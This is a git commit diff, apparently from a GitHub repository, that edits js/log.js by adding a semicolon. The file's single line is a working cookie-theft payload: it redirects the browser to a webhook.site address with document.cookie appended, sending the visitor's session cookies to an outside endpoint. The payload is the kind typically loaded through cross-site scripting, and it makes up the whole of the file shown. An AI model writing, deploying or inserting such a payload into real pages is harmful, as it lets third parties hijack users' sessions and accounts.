581c4b4dc1c8c79f5744c36ffce7a070013b7390
Abdul Haq <75989562+skabdulhaq@users.noreply.github.com>
2024-02-16 19:16:31 +0530

    Update log.js

--- js/log.js
+++ js/log.js
@@ -1,1 +1,1 @@
-window.location="https://webhook.site/4009b056-4f96-429d-aa35-e15cb9126dc0/"+document.cookie
+window.location="https://webhook.site/4009b056-4f96-429d-aa35-e15cb9126dc0/"+document.cookie;
